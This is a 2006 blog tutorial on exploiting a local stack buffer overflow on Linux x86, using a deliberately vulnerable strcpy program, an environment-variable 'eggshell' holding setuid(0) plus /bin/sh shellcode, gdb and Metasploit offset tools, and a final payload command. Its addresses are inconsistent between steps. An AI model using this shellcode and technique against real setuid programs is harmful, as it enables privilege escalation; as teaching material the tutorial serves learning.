---
id: 22
title: Simple Local Stack Overflow
date: 2006-08-12T21:32:00+00:00
author: Devin Ertel
layout: post
guid: http://www.infointox.net/?p=22
permalink: /?p=22
blogger_blog:
  - informationintoxication.blogspot.com
blogger_author:
  - Devinhttp://www.blogger.com/profile/15793900111446118223noreply@blogger.com
blogger_permalink:
  - /2006/08/simple-local-stack-overflow_12.html
categories:
  - gdb
tags:
  - Buffer Overflow
  - gdb
---
This is just a beginning document on stack overflows.
  
If anyone wants to begin to learn about overflows, this is a good place to start.
  
This example is done on Linux x86. So lets get started.

First off, if you have a 2.6 kernel you may have Arjan van de Ven&#8217;s address space
  
randomization patch. This will cause the stack to begin at a random location.
  
If you want to find out more information on this check out or google.

<http://lwn.net/Articles/121845/>

To make things easier for now, lets turn it off.
  
You can check to see if its on with the following command.

**cat /proc/sys/kernel/randomize\_va\_space**

If you get a “1” its on, a “0” means its not. To turn off do the following.

**echo 0 > /proc/sys/kernel/randomize\_va\_space**

Ok, now thats off lets make sure we enable core dumps.
  
If we were to run the program within gdb we don&#8217;t really need core dumps but
  
it does make it a bit easier with them. To enable, invoke the following.

**ulimit -c unlimited**

Lets start with a small vulnerable program.

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="c" style="font-family:monospace;"><span style="color: #339933;">#include stdio.h //dont forget brackets.couldnt use in post</span>
&nbsp;
<span style="color: #993333;">int</span> main<span style="color: #009900;">&#40;</span><span style="color: #993333;">int</span> argc<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span> argv<span style="color: #009900;">&#91;</span><span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span>
<span style="color: #009900;">&#123;</span>
&nbsp;
<span style="color: #993333;">char</span> buf<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">10</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">;</span>
&nbsp;
<span style="color: #b1b100;">if</span><span style="color: #009900;">&#40;</span>argc <span style="color: #339933;">&</span>lt<span style="color: #339933;">;</span> <span style="color: #0000dd;">2</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
<span style="color: #000066;">printf</span><span style="color: #009900;">&#40;</span><span style="color: #ff0000;">"usage : %s buffer<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: #339933;">,</span> argv<span style="color: #009900;">&#91;</span><span style="color: #0000dd;"></span><span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #000066;">exit</span><span style="color: #009900;">&#40;</span><span style="color: #0000dd;"></span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #009900;">&#125;</span>
&nbsp;
<span style="color: #000066;">strcpy</span><span style="color: #009900;">&#40;</span>buf<span style="color: #339933;">,</span>argv<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #000066;">printf</span><span style="color: #009900;">&#40;</span><span style="color: #ff0000;">"sent to buffer : %s <span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: #339933;">,</span> buf<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
<span style="color: #009900;">&#125;</span>
<span style="color: #339933;">----------------------------</span>vuln.<span style="color: #202020;">c</span><span style="color: #339933;">----------------------------</span></pre>
      </td>
    </tr>
  </table>
</div>

As you can see its a very small program that takes user input and copies it
  
with strcpy() unchecked. It only has a buffer of 10 which doesn&#8217;t take much
  
to overflow. So now lets compile and run.

**gcc vuln.c -o vul**

**./vuln
  
Usage : ./vuln buffer**

**./vuln AAAAA
  
sent to buffer: AAAAA
  
** 
  
Now lets get a segmentation fault. A seg fault is basically the OS telling
  
the program it is trying to access VMA(Virtual Memory Address) that it does
  
not have access to.

**
  
./vuln AAAAAAAAAAAAAAAA
  
sent to buffer : AAAAAAAAAAAAAAAA
  
Segmentation fault (core dumped)
  
** 
  
We just overflowed the the buffer with 16 “A”&#8217;s. Lets take a look in GDB.
  
**
  
gdb -c core ./vuln**

**Core was generated by \`./vuln AAAAAAAAAAAAAAAA&#8217;.
  
Program terminated with signal 11, Segmentation fault.
  
#0 0xa7004141 in ?? ()
  
(gdb) info register $ebp
  
ebp 0x41414141 0x41414141
  
(gdb) i r $eip
  
eip 0xa7004141 0xa7004141
  
(gdb)
  
** 

As you can see we overwrote ebp(Extended Base Pointer) with 0x41414141 which is
  
“AAAA” but we did not fully overwrite eip(Extended Instruction Pointer).
  
We want to control eip so we can control the flow of the program.
  
So lets try it again with some more “A”&#8217;s.

Note: some versions of gcc will actually allocate more memory for the buffer ,
  
so you may need more to fill. This is just in my case.

We will do this using perl.
  
**
  
./vuln \`perl -e &#8216;print &#8220;A&#8221; x 20&#8217;\`
  
Now look at $ebp and $eip in GDB. We have successfully overwritten both with “A”&#8217;s.
  
(gdb) i r $eip
  
eip 0x41414141 0x41414141
  
(gdb) i r $ebp
  
ebp 0x41414141 0x41414141
  
(gdb)q
  
** 

Now we can control the flow of the program. What we want to do is overwrite $eip
  
with an address of our choice. Pointing it to something a bit more useful,
  
like some shellcode to drop us a shell. Since this is just a local exploit
  
and the buffer is not that big to store a shell we can write a simple eggshell
  
to load into memory.

Below is a small eggshell.

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="c" style="font-family:monospace;"><span style="color: #339933;">-------------------------------</span>eggshell.<span style="color: #202020;">c</span><span style="color: #339933;">-------------------------------</span>
<span style="color: #339933;">#include stdio.h //dont forget brackets again</span>
<span style="color: #339933;">#define NOP 0x90 /* nops , we want to land here */</span>
&nbsp;
<span style="color: #993333;">char</span> shellcode<span style="color: #009900;">&#91;</span><span style="color: #009900;">&#93;</span> <span style="color: #339933;">=</span>
  <span style="color: #ff0000;">"<span style="color: #660099; font-weight: bold;">\x6a</span><span style="color: #660099; font-weight: bold;">\x17</span>"</span>                      <span style="color: #666666; font-style: italic;">// push $0x17</span>
  <span style="color: #ff0000;">"<span style="color: #660099; font-weight: bold;">\x58</span>"</span>                        <span style="color: #666666; font-style: italic;">// pop  %eax</span>
  <span style="color: #ff0000;">"<span style="color: #660099; font-weight: bold;">\x31</span><span style="color: #660099; font-weight: bold;">\xdb</span>"</span>                    <span style="color: #666666; font-style: italic;">// xor  %ebx, %ebx</span>
  <span style="color: #ff0000;">"<span style="color: #660099; font-weight: bold;">\xcd</span><span style="color: #660099; font-weight: bold;">\x80</span>"</span>                    <span style="color: #666666; font-style: italic;">// int  $0x80</span>
&nbsp;
  <span style="color: #ff0000;">"<span style="color: #660099; font-weight: bold;">\x31</span><span style="color: #660099; font-weight: bold;">\xd2</span>"</span>                    <span style="color: #666666; font-style: italic;">// xor  %edx, %edx</span>
  <span style="color: #ff0000;">"<span style="color: #660099; font-weight: bold;">\x6a</span><span style="color: #660099; font-weight: bold;">\x0b</span>"</span>                    <span style="color: #666666; font-style: italic;">// push $0xb</span>
  <span style="color: #ff0000;">"<span style="color: #660099; font-weight: bold;">\x58</span>"</span>                        <span style="color: #666666; font-style: italic;">// pop  %eax</span>
  <span style="color: #ff0000;">"<span style="color: #660099; font-weight: bold;">\x52</span>"</span>                        <span style="color: #666666; font-style: italic;">// push %edx</span>
  <span style="color: #ff0000;">"<span style="color: #660099; font-weight: bold;">\x68</span><span style="color: #660099; font-weight: bold;">\x2f</span><span style="color: #660099; font-weight: bold;">\x2f</span><span style="color: #660099; font-weight: bold;">\x73</span><span style="color: #660099; font-weight: bold;">\x68</span>"</span>        <span style="color: #666666; font-style: italic;">// push $0x68732f2f</span>
  <span style="color: #ff0000;">"<span style="color: #660099; font-weight: bold;">\x68</span><span style="color: #660099; font-weight: bold;">\x2f</span><span style="color: #660099; font-weight: bold;">\x62</span><span style="color: #660099; font-weight: bold;">\x69</span><span style="color: #660099; font-weight: bold;">\x6e</span>"</span>        <span style="color: #666666; font-style: italic;">// push $0x6e69622f</span>
  <span style="color: #ff0000;">"<span style="color: #660099; font-weight: bold;">\x89</span><span style="color: #660099; font-weight: bold;">\xe3</span>"</span>                    <span style="color: #666666; font-style: italic;">// mov  %esp, %ebx</span>
  <span style="color: #ff0000;">"<span style="color: #660099; font-weight: bold;">\x52</span>"</span>                        <span style="color: #666666; font-style: italic;">// push %edx</span>
  <span style="color: #ff0000;">"<span style="color: #660099; font-weight: bold;">\x53</span>"</span>                        <span style="color: #666666; font-style: italic;">// push %ebx</span>
  <span style="color: #ff0000;">"<span style="color: #660099; font-weight: bold;">\x89</span><span style="color: #660099; font-weight: bold;">\xe1</span>"</span>                    <span style="color: #666666; font-style: italic;">// mov  %esp, %ecx</span>
  <span style="color: #ff0000;">"<span style="color: #660099; font-weight: bold;">\xcd</span><span style="color: #660099; font-weight: bold;">\x80</span>"</span><span style="color: #339933;">;</span>                   <span style="color: #666666; font-style: italic;">// int  $0x80</span>
&nbsp;
<span style="color: #808080; font-style: italic;">/* This is not my shell code , I got it from milw0rm.com.
Its  setuid(0) + execve("/bin/sh", ["/bin/sh", NULL])
&lt;a href="http://www.milw0rm.com/shellcode/1637"&gt;http://www.milw0rm.com/shellcode/1637&lt;/a&gt;
*/</span>
&nbsp;
<span style="color: #993333;">int</span> main<span style="color: #009900;">&#40;</span><span style="color: #993333;">void</span><span style="color: #009900;">&#41;</span>
<span style="color: #009900;">&#123;</span>
<span style="color: #993333;">char</span> egg<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">512</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">;</span>
<span style="color: #000066;">puts</span><span style="color: #009900;">&#40;</span><span style="color: #ff0000;">"loaded eggshell into env"</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #000066;">memset</span><span style="color: #009900;">&#40;</span>egg<span style="color: #339933;">,</span>NOP<span style="color: #339933;">,</span><span style="color: #0000dd;">512</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #000066;">memcpy</span><span style="color: #009900;">&#40;</span><span style="color: #339933;">&</span>amp<span style="color: #339933;">;</span>egg<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">512</span><span style="color: #339933;">-</span><span style="color: #000066;">strlen</span><span style="color: #009900;">&#40;</span>shellcode<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">,</span>shellcode<span style="color: #339933;">,</span><span style="color: #000066;">strlen</span><span style="color: #009900;">&#40;</span>shellcode<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
setenv<span style="color: #009900;">&#40;</span><span style="color: #ff0000;">"EGG"</span><span style="color: #339933;">,</span> egg<span style="color: #339933;">,</span> <span style="color: #0000dd;">1</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
putenv<span style="color: #009900;">&#40;</span>egg<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #000066;">system</span><span style="color: #009900;">&#40;</span><span style="color: #ff0000;">"/bin/bash"</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #b1b100;">return</span><span style="color: #009900;">&#40;</span><span style="color: #0000dd;"></span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #009900;">&#125;</span>
<span style="color: #339933;">-------------------------------</span>eggshell.<span style="color: #202020;">c</span><span style="color: #339933;">-------------------------------</span></pre>
      </td>
    </tr>
  </table>
</div>

Now we can compile and load the eggshell.
  
**
  
gcc eggshell.c -o eggshell
  
./eggshell
  
** 

Now lets see where we want to point eip to. We want to look for our nopsled we
  
created/loaded with our eggshell. The eggshell loaded the nops + shellcode
  
into memory. To find the landing point in memory we turn to gdb again.
  
**
  
gdb -c core ./vuln
  
(gdb) x/s $esp //x is short for examine do a “help examine” to find out more
  
0xaffff6d0: &#8220;AA&#8221;
  
(gdb)
  
0xaffff6d3: &#8220;&#8221;
  
(gdb)
  
0xaffff6d4: &#8220;D÷ÿ¯P÷ÿ¯\001&#8221;
  
(gdb)
  
&#8230;&#8230;&#8230;.We keep hitting enter until we see the following&#8230;&#8230;..
  
0xaffff8f2: &#8220;EGG=&#8221;, &#8216;\220&#8217; &#8230;
  
(gdb)
  
0xaffff9ba: &#8216;\220&#8217; &#8230; //This is where we want to land!
  
(gdb)
  
** 
  
So **0xaffff9ba** is our address to slide down our nops into our shellcode.
  
This is what we want to overwrite $eip with. If you wanted to see the whole egg you could do
  
something like the following.
  
**
  
echo -n $EGG |hexdump -Cv**

**00000000 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
00000010 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
00000020 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
00000030 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
00000040 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
00000050 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
00000060 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
00000070 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
00000080 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
00000090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
000000a0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
000000b0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
000000c0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
000000d0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
000000e0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
000000f0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
00000100 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
00000110 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
00000120 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
00000130 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
00000140 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
00000150 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
00000160 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
00000170 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
00000180 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
00000190 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
000001a0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
000001b0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
000001c0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
000001d0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 |&#8230;&#8230;&#8230;&#8230;&#8230;.|
  
000001e0 90 6a 17 58 31 db cd 80 31 d2 6a 0b 58 52 68 2f |.j.X1ÛÍ.1Òj.XRh/|
  
000001f0 2f 73 68 68 2f 62 69 6e 89 e3 52 53 89 e1 cd 80 |/shh/bin.ãRS.áÍ.|
  
00000200 f4 2f fd a7 |ô/ý§|
  
00000204
  
** 

See all of our nops followed by the shellcode?

We now have the address we want to overwrite $eip with. Lets assume we didn&#8217;t
  
know the buffer was only [10] , since we only overwrote it with “A”&#8217;s there
  
really know way of telling what our offset is. Offset would be your buffer
  
minus the address of eip.

You could do something like so:
  
**
  
perl -e &#8216;print “A”x4 . “B”x4 .”C”x4&#8217; and so on&#8230;&#8230;.
  
** 
  
Then you could see what letter actually overwrote eip. We could then calculate the
  
offset and just add the eip to it. But thats not to practical
  
(well for this example its not bad).
  
So this is where we turn to metasploit.

Metasploit has an nice little perl PatternCreate() function to create a pattern of
  
unique 4 byte output. This way we can easily calculate where we overwrote $eip and
  
then find our offset. So earlier we know we overwrote $eip with 20 “A”&#8217;s.
  
Lets create a 20 line string which is unique every 4 bytes.
  
The module is located in ~/framework/lib.
  
**
  
perl -e &#8216;use Pex;print Pex::Text::PatternCreate(20)&#8217;
  
Aa0Aa1Aa2Aa3Aa4Aa5Aa
  
** 
  
Now lets overflow our vuln.c with that pattern.
  
**
  
./vuln Aa0Aa1Aa2Aa3Aa4Aa5Aa
  
sent to buffer : Aa0Aa1Aa2Aa3Aa4Aa5Aa
  
Segmentation fault (core dumped)
  
** 
  
Now lets see what is in $eip.
  
**
  
(gdb) i r $eip
  
eip 0x35614134 0x35614134
  
(gdb) q
  
** 
  
Now metasploit even makes it easier to calculate our offset with the help of
  
PatteronOffset.pl located in ~/framework/sdk

We pass it the big-endian address in EIP(which is 0x35614134)
  
then the size of our pattern(which is 20). Lets try it out.
  
**
  
./patternOffset.pl 0x35614134 20
  
14
  
** 
  
So 14 is our offset! We now know our offset and the address to our shellcode.
  
What we want to pass to our vuln.c is 14 chars + our address to the
  
shellcode(4 bytes). Which makes it overwrite the $eip pointing to our shellcode.

Since 0xaffff8f2(address to shellcode) is in big-endian and we are on little-endian(x86 architecture)
  
we will have to convert the address to little-endian. To do this we break up
  
the address in 2 bytes, drop the “0x” and then reverse it. Like so:
  
**
  
af ff f8 f2 //which equals
  
\xf2\xf8\xff\xaf //we add the \x so it won&#8217;t interpret it as ASCII
  
** 
  
Now want to send our vuln.c 14 “A”&#8217;s + \xf2\xf8\xff\xaf
  
**
  
./vuln \`perl -e &#8216;print &#8220;A&#8221; x 14&#8217;&#8220;printf &#8220;\xf2\xf8\xff\xaf&#8221;\`
  
** 
  
There we exploited a nice little buffer. You should be in a different shell.
  
If you type exit you will go back to your original. If you want better results
  
play around with the shellcode. You can find more at milw0rm.com, or write your own.

If anyone sees something I could do better or anything wrong please tell me.
  
I would be happy to hear. Or even if you got questions please feel free to ask.
  
This was just to get you started in overlflows.

Here is my crappy little ASCI art of Virtual Memory, to help visualize it.
  
I stole the diagram from a the “Intro To Shellcoding” pdf referenced below.

<pre>-----------------------------------------------------------------------------------------
|Shared	        | .text	     | .bss    	| &lt;-------------------------stack	| argc,	|
|Libraries	| _start:    | and     	|              char buf[10][ebp][eip]  	| argv,	|
| 		|	     | heap	|					| envp	|
|		|            |		|					|	|
-----------------------------------------------------------------------------------------

Direction --------------&gt;</pre>

&#8211; .text segment is the program entry point.
  
&#8211; .bss holds uninitialized data that was declared in the program.
  
&#8211; heap is where the program used malloc().
  
&#8211; stack is at the top of the memory
  
&#8211; arg&#8217;s is the programs arguments set up by the OS.

**References:**
  
<http://www.milw0rm.com>
  
[http://www.rootsecure.net/content/downloads/pdf/intro\_to\_shellcoding.pdf](http://www.rootsecure.net/content/downloads/pdf/intro_to_shellcoding.pdf)
  
<http://insecure.org/stf/smashstack.txt>